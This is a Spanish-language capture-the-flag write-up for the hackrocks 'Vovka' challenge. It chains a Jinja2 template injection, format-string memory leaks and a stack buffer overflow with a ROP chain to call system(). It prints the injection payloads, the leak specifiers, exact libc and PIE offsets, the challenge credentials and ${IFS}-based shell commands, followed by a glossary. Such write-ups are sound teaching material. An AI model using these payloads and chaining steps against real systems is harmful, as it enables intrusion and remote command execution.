# Vovka

[Español](README.md) | [English](README.en.md)

**Reto 8 · PWN · Dificultad: Difícil**

## Descripción

> Investiga el portal, descubre cualquier secreto oculto y consigue acceso a las credenciales restringidas del desafío. Una vez dentro, te conectarás a un servicio binario protegido donde te espera una segunda vulnerabilidad.
>
> ¿Serás capaz de encadenar ambas vulnerabilidades y recuperar el indicador oculto tras la última capa de control de acceso?

**Acceso:** [https://challenges.hackrocks.com/vovka](https://challenges.hackrocks.com/vovka)

## Flag

```
b4ck_t0_bl1nd_with_l1bc
```

## Resolución

Al entrar al desafío hay una página con un formulario que permite introducir un nombre para generar un saludo.

Intentando introducir:

```
{{7*7}}
```

El servidor responde:

```
Hello, 49!
```

Esto confirma una vulnerabilidad **SSTI (Server-Side Template Injection)**: el servidor está interpretando la entrada como una expresión de plantilla Jinja2 en lugar de tratarla como texto.

Se aprovecha esto para consultar la configuración de Flask introduciendo:

```
{{config}}
```

Entre los valores devueltos está:

```
SECRET_KEY: 'ctfuser:vv_1ns3cur3!'
```

La clave contiene las credenciales necesarias para iniciar sesión en el portal.

```
Usuario: ctfuser
Contraseña: vv_1ns3cur3!
```

Se inicia sesión desde:

[https://challenges.hackrocks.com/vovka/login](https://challenges.hackrocks.com/vovka/login)

Una vez dentro, el dashboard revela las credenciales de acceso al servicio binario:

```
HOST: challenges2.hackrocks.com
PORT: 1021
USERNAME: player
PASSWORD: Bl1nd_Fmt_Str1ng_G0!
```

Se establece conexión utilizando Netcat:

```
nc challenges2.hackrocks.com 1021
```

Tras introducir las credenciales aparece:

```
username: player
password: Bl1nd_Fmt_Str1ng_G0!

Access granted.

log>
```

El servicio solicita primero un registro (`log>`) y después un comentario (`Comments>`).

En `log>` se puede introducir especificadores de formato como:

```
AAAA.%p.%p.%p.%p
```

El programa devuelve direcciones de memoria, lo que demuestra una vulnerabilidad **Format String**.

Esta vulnerabilidad permite filtrar información de la memoria necesaria para superar las protecciones del ejecutable.

En particular, se utilizó:

- `%47$p`: obtiene el **Stack Canary**.
- `%49$p`: filtra una dirección que permite calcular la base del ejecutable (PIE).
- `%3$p`: obtiene una dirección del buffer en la pila.
- `%30$.8s`: permite leer el contenido de `puts@GOT` para calcular la base de libc.

La segunda vulnerabilidad aparece en `Comments>`, donde existe un **Buffer Overflow**.

Se determinó que el canary comienza después de 328 bytes de entrada. Esto permite construir un payload que sobrescribe la dirección de retorno sin activar la protección del canary, siempre que se conserve su valor original.

Con las direcciones filtradas se puede construir una cadena **ROP (Return-Oriented Programming)** para llamar a `system()` desde libc.

El procedimiento consiste en:

1. Filtrar el canary y la base PIE mediante la Format String.
2. Aprovechar el Buffer Overflow para regresar a la rutina de login y disponer de otra entrada `log>`.
3. Filtrar la dirección de `puts` desde la GOT y calcular la base de libc.
4. Construir una cadena ROP que coloque el comando en el argumento de `system()`.
5. Ejecutar un comando para leer el archivo que contiene la flag.

Los desplazamientos utilizados en la explotación fueron:

| Elemento             | Offset           |
| -------------------- | ---------------- |
| Canary               | 328 bytes        |
| Dirección de retorno | 344 bytes        |
| Reentrada al login   | PIE + `0x10e0`   |
| `puts@GOT`           | PIE + `0x4000`   |
| `puts`               | libc + `0x77980` |
| `system`             | libc + `0x4c490` |
| `pop rdi; ret`       | libc + `0x277e5` |
| `ret`                | libc + `0x27182` |

Para automatizar el proceso se utilizó el script final [`vovka_termux_tail.py`](./vovka_termux_tail.py) brindado por GPT.

**Nota:** Los offsets corresponden a la versión de libc identificada durante la resolución.

Para ejecutarlo:

```
python3 vovka_termux_tail.py
```

### Obtención de la flag

Al ejecutar el exploit se consiguió llamar a `system()` y ejecutar comandos dentro del servicio.

Primero se comprobó que el comando funcionara:

```
[system, align=True, #1]
b'VOVKA_OK\nAccess denied.\n'

[+] EJECUCION CONFIRMADA.
```

Después se consultó el directorio actual:

```
[CMD] pwd;ls${IFS}-la;ls${IFS}/

[RESPUESTA]
/home/ctf
```

En ese directorio se encontró el archivo `flag.txt`.

Finalmente:

```
cat${IFS}./flag*;cat${IFS}/flag*
```

Se utiliza `${IFS}` en lugar de espacios porque la entrada vulnerable del programa utiliza `scanf("%s")`, que termina la lectura al encontrar caracteres de espacio en blanco.

La respuesta obtenida fue:

```
[RESPUESTA]
b4ck_t0_bl1nd_with_l1bc
cat: '/flag*': No such file or directory
Access denied.
```

El primer comando consiguió leer correctamente `/home/ctf/flag.txt`, recuperando el indicador del desafío.


## Conclusión

Primero se utilizó una **SSTI** para recuperar las credenciales del portal y acceder al servicio binario.
Después se aprovechó una **Format String** para filtrar direcciones de memoria y superar las protecciones ASLR, PIE y Stack Canary. Finalmente, se utilizó un **Buffer Overflow** junto con una cadena ROP para ejecutar `system()` y leer el archivo que contenía la flag.

## Glosario de conceptos

### Contexto del reto y aplicación web

- **SSTI (Server-Side Template Injection):** fallo que aparece cuando una entrada no confiable se incorpora al código de una plantilla y el servidor la evalúa como instrucciones, en lugar de manejarla únicamente como datos. Sus efectos dependen del motor y de los objetos accesibles.

- **Motor de plantillas / Jinja2:** componente que combina una plantilla con datos para generar una salida, normalmente HTML. Jinja2 es un motor utilizado habitualmente con Flask.

- **Flask:** framework web de Python. Su objeto de configuración reúne parámetros de la aplicación; exponerlo puede revelar información sensible.

- **SECRET_KEY:** clave de Flask utilizada, entre otros usos, para firmar datos de sesión.

### Servicio remoto y representación de datos

- **Binario:** programa compilado en instrucciones de máquina. Su comportamiento depende de su arquitectura, bibliotecas y entorno de ejecución.

- **Buffer:** región de memoria destinada a almacenar datos temporalmente. Un límite de tamaño debe respetarse para evitar sobrescribir regiones vecinas.

- **Byte, hexadecimal y puntero:** un byte contiene 8 bits; la notación hexadecimal representa valores en base 16 y suele llevar el prefijo `0x`. Un puntero es un valor que representa una dirección de memoria.

- **Little-endian:** orden de almacenamiento en el que el byte menos significativo aparece primero. Es relevante al interpretar direcciones serializadas en arquitecturas que usan este orden.

- **Byte nulo (`\0`):** byte de valor cero que marca el final de una cadena de C convencional.

- **Delimitador y caracteres problemáticos:** un delimitador separa entradas o campos. Ciertos bytes pueden cortar o transformar una entrada según cómo la procese el programa.

- **`scanf` y `%s`:** en C, esta conversión lee una secuencia de caracteres hasta encontrar espacio en blanco. Sin un ancho máximo adecuado y un buffer suficiente puede producir una escritura fuera de límites.

- **`${IFS}`:** expansión de una variable del shell asociada a la separación de campos. Su efecto depende del shell y del contexto de expansión.

### Memoria, ejecución y protecciones

- **Stack o pila:** región de memoria que suele contener datos de llamadas activas, como variables locales y estado de retorno. Un **stack frame** es la porción asociada a una llamada concreta.

- **Dirección de retorno:** dirección de memoria a la que debe continuar la ejecución al finalizar una llamada. En x86-64, **RIP** es el registro que identifica la instrucción en ejecución.

- **Buffer overflow:** lectura o escritura que supera los límites de un buffer. Una escritura fuera de límites puede corromper datos vecinos y, en determinadas condiciones, afectar al flujo de ejecución.

- **Format string:** cadena que indica a una función de formato cómo interpretar sus argumentos. Existe una vulnerabilidad cuando datos no confiables se utilizan como formato.

- **Leak:** filtración de datos internos, como direcciones de memoria.

- **Offset y dirección base:** un offset es un desplazamiento respecto a una referencia; la base es el inicio de un módulo o región cargada. Los offsets dependen de la versión exacta del binario o biblioteca.

- **ASLR:** protección que aleatoriza la ubicación de regiones del proceso para dificultar la predicción de direcciones.

- **PIE:** ejecutable independiente de posición, preparado para cargarse en distintas direcciones base y participar en la aleatorización del sistema.

- **Stack canary:** valor de comprobación que puede colocarse en la pila y verificarse antes del retorno para detectar determinadas corrupciones. No impide todos los desbordamientos.

- **NX / DEP:** protección que impide ejecutar instrucciones en páginas marcadas como no ejecutables.

- **ABI y alineación de pila:** la ABI define convenciones como el paso de argumentos y la conservación de registros. La pila debe respetar la alineación requerida al realizar llamadas.

### Bibliotecas y reutilización de código

- **libc:** biblioteca estándar de C que ofrece funciones comunes al programa. Su implementación y versión influyen en las direcciones y el comportamiento.

- **Enlazado dinámico, GOT y PLT:** el enlazado dinámico resuelve referencias a bibliotecas durante la carga o ejecución. La GOT (*Global Offset Table*) contiene entradas utilizadas para referencias dinámicas; la PLT (*Procedure Linkage Table*) contiene secuencias de código que participan en llamadas a funciones externas.

- **ROP (Return-Oriented Programming):** técnica que reutiliza fragmentos de código existentes para encadenar operaciones y alterar el flujo de ejecución.

- **Gadget y cadena ROP:** un gadget es una secuencia corta de instrucciones aprovechable para una operación, frecuentemente terminada en un retorno. Una cadena ROP combina esas secuencias y los datos que consumen.

- **`ret` y `pop`:** instrucciones de máquina. `ret` recupera de la pila el destino de retorno; `pop` extrae un valor hacia su destino y actualiza el puntero de pila.

- **`puts` y `system`:** funciones de C. `puts` escribe una cadena y añade un salto de línea; `system` solicita ejecutar una cadena mediante un intérprete de comandos.
